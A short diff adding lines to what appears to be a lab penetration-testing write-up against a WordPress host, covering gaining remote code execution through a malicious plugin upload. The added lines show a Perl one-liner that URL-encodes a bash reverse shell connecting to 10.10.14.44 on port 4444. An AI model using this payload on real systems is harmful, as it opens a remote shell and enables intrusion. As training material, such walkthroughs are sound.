@@ -116,6 +116,12 @@ curl -i http://offsecwp \
 
 ---
 
+URL Encode One liner for default Kali
+```bash 
+perl -MURI::Escape -e 'print uri_escape("bash -i >& /dev/tcp/10.10.14.44/4444 0>&1"),"\n"'
+
+```
+
 ## 📦 Step 6: Gaining RCE via Malicious Plugin Upload
 
 Logged in using the new admin credentials and uploaded a **custom reverse shell plugin**.
